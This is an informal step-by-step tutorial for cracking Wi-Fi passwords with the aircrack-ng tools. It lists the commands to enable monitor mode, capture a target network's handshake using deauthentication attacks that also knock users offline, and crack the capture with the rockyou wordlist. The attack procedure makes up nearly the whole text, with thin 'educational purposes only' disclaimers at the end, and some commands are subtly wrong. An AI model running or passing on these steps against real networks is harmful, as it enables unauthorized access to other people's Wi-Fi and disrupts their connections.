iwconfig (You will see that the mode is managed)
sudo airmon-ng check kill (kills any conflicting processes)
sudo airmon-ng start wlan0 (starts monitor mode, your internet connection will stop because your laptop is monitorring trafic)
iwconfig (You wil see that the mode is managed)

sudo airodump-ng wlan0mon (take a note of the BSSID and the channel)
sudo airodump-ng wlan0mon -d BSSID (change BSSID in the mac adres from the network you want to attack)

sudo airodump-ng -w hack1 -c channel -bssid BSSID wlan0mon (change BSSID and channel with the channel and the mac adress from the network you want to attack)
sudo aireplay-ng --deauth 0 -a BSSID (change BSSID again in the mac adress from the network you want to attack) (this command is also another hack where you can "smash" everyone of the wifi network that you want to)
ls (you will see your that there are a few new files like hack1-01.cap were made)

sudo airmon-ng stop wlan0mon (stops monitor mode)
iwconfig (you will see that the mode is back changed to managed)

NOW WE ARE GOING TO DO THE CRACK:
cd /usr/share/wordlists/ (goes to the map where al the wordlists are hided)
gunzip -k rockyou.txt.gz (unzips the rockyou.txt.gz file to rockyou.txt)
cd (leaves the folder)
HERE IT COMES:
aircrack-ng hack1-01.cap -w /usr/share/wordlists.rockyou.txt (starts the hack)




Extra info:
- This is an easy and fast way to crack passwords but you can't crack all the passwords with this way.
- You can also bruteforce a password but thats a bit more difficult and it could be a really long time before you cracked the password
- Do not use it without permission. Only do it on your own wifi or a network where you have permission on. This is for educational purposes only!
- The RockYou wordlist is a really big list of passwords that people use so never use such as dumb passwords like hello123 or hellohello or superman.
- I recommand to do this in Kali linux (You can run it like your normal OS but also on a bootable USB flash drive or Virtual Machine like virtualbox) It's not possible to do this on windows. You really need a linux distro.
- In kali aircrack-ng is already installed but if you use another linux distro like ubuntu or debian, you have to install aircrack-ng first.

ALWAYS USE GOOD PASSWORDS. NEVER USE PASSWORDS LIKE SPIDERMAN OR HELLOHELLO!
AND DON'T FORGET! FOR EDUCATIONAL PURPOSES ONLY!
